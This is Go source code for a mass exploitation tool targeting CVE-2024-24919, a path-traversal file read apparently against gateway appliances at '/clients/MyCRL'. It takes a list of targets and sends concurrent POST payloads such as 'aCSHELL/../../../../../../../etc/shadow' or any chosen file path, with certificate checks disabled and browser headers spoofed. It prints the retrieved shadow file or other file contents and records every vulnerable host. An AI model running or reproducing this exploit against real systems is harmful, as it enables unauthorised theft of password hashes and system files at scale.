package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/schollz/progressbar/v3"
)

var (
	vulnWords             = []string{"root:", "nobody:"}
	maxConcurrentRequests = 70 // Adjust this value based on your system's capabilities
	Reset                 = "\033[0m"
	Red                   = "\033[31m"
	Yellow                = "\033[33m"
	cve                   = fmt.Sprintf(
		"╔══════════════════════════════════════════════════════╗\n" +
			"║                                                      ║\n" +
			"║                      CVE-2024-24919                  ║\n" +
			"║                                                      ║\n" +
			"╚══════════════════════════════════════════════════════╝\n")
)

func makeRequest(url, payload string, headers map[string]string, wg *sync.WaitGroup, semaphore chan struct{}, results chan<- string, fileMu *sync.Mutex, file *os.File, bar *progressbar.ProgressBar, basepayload string) {
	defer func() {
		<-semaphore // release semaphore
		wg.Done()
		bar.Add(1)
	}()

	client := &http.Client{
		Timeout: time.Duration(10 * time.Second),
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   true,
			DisableCompression:  true,
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     10 * time.Second,
		},
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		// results <- fmt.Sprintf("\r\033[K[!] Error creating request to %s: %v\n", url, err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		// results <- fmt.Sprintf("\r\033[K[!] Error making request to %s: %v\n", url, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			// results <- fmt.Sprintf("\r\033[K[!] Error reading response from %s: %v\n", url, err)
			return
		}
		body := string(bodyBytes)

		isVulnerable := false
		for _, word := range vulnWords {
			if strings.Contains(body, word) {
				isVulnerable = true
				break
			}
		}

		if isVulnerable {
			results <- fmt.Sprintf("\r\033[K[+]%s %s is vulnerable%s\n", Yellow, url, Reset)
			fileMu.Lock()
			defer fileMu.Unlock()
			_, err := file.WriteString(url + "\n")
			if err != nil {
				results <- fmt.Sprintf("\r\033[K[!] Error writing to file: %v\n", err)
			}
			if payload == "aCSHELL/../../../../../../../etc/shadow" {
				results <- fmt.Sprintf(
					"\r\033[K╔══════════════════════════════════════════════════════╗\n"+
						"║                    etc/shadow found:                 ║\n"+
						"╚══════════════════════════════════════════════════════╝\n"+
						"╔══════════════════════════════════════════════════════╗\n"+
						"\n%s\n"+
						"╚══════════════════════════════════════════════════════╝\n", body)
			} else {
				results <- fmt.Sprintf(
					"\r\033[K╔══════════════════════════════════════════════════════╗\n"+
						"║                    %s found:                 ║\n"+
						"╚══════════════════════════════════════════════════════╝\n"+
						"╔══════════════════════════════════════════════════════╗\n"+
						"\n%s\n"+
						"╚══════════════════════════════════════════════════════╝\n", basepayload, body)
			}
		} else {
			results <- fmt.Sprintf("\r\033[K[-]%s %s is not vulnerable%s\n", Red, url, Reset)
		}
	}
}

func main() {
	fmt.Println(cve)
	payloadBase := "aCSHELL/../../../../../../../%s"
	var payload string

	listFile := flag.String("l", "", "File containing list of HTTP/HTTPS targets")
	customFile := flag.String("p", "", "Custom payload")
	flag.Parse()

	headers := map[string]string{
		"User-Agent":                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language":           "en-US,en;q=0.5",
		"Accept-Encoding":           "gzip, deflate, br",
		"Upgrade-Insecure-Requests": "1",
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Dnt":                       "1",
		"Sec-Gpc":                   "1",
		"Te":                        "trailers",
		"Connection":                "close",
	}

	if *customFile != "" {
		payload = fmt.Sprintf(payloadBase, *customFile)
	} else {
		payload = "aCSHELL/../../../../../../../etc/shadow"
	}

	if *listFile != "" {
		file, err := os.Open(*listFile)
		if err != nil {
			fmt.Printf("Error: File '%s' not found.\n", *listFile)
			return
		}
		defer file.Close()

		outputFile, err := os.Create("vulnerable_results.txt")
		if err != nil {
			fmt.Printf("Error creating output file: %v\n", err)
			return
		}
		defer outputFile.Close()

		var wg sync.WaitGroup
		semaphore := make(chan struct{}, maxConcurrentRequests)
		results := make(chan string, maxConcurrentRequests)
		fileMu := &sync.Mutex{}

		// Count the number of URLs
		scanner := bufio.NewScanner(file)
		var urlCount int
		for scanner.Scan() {
			urlCount++
		}

		// Create and start the progress bar
		bar := progressbar.NewOptions(urlCount,
			progressbar.OptionSetWriter(os.Stderr),
			progressbar.OptionSetWidth(30),
			progressbar.OptionSetDescription("\r\033[KScanning..."),
			progressbar.OptionSetRenderBlankState(true),
			progressbar.OptionShowIts(),
			progressbar.OptionShowCount(),
			progressbar.OptionShowElapsedTimeOnFinish(),
			progressbar.OptionOnCompletion(func() {
				fmt.Fprint(os.Stderr, "\n")
			}),
			// progressbar.OptionSpinnerType(14),
			// progressbar.OptionThrottle(65*time.Millisecond),
		)

		// Reset the file scanner to the beginning
		file.Seek(0, 0)
		scanner = bufio.NewScanner(file)

		go func() {
			for result := range results {
				fmt.Print(result)
			}
		}()

		for scanner.Scan() {
			url := strings.TrimSpace(scanner.Text())
			if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
				url = "http://" + url
			}
			wg.Add(1)
			semaphore <- struct{}{} // acquire semaphore
			go makeRequest(url+"/clients/MyCRL", payload, headers, &wg, semaphore, results, fileMu, outputFile, bar, *customFile)
		}

		if err := scanner.Err(); err != nil {
			fmt.Printf("\r\033[KError reading file: %v\n", err)
		}

		wg.Wait()
		close(semaphore)
		close(results)
	} else {
		fmt.Println("\r\033[KPlease provide a file containing list of HTTP/HTTPS targets using -l option.")
		os.Exit(0)
	}
}
